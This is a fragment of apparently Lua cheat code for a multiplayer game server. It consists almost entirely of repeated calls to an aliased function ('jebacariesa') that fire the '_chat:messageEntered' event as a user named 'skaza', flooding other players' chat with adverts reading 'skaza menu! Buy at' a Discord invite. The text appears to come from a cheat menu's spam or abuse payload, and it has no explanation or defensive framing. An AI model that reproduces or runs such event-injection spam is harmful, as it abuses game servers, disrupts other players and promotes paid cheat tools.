				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
								jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
								jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
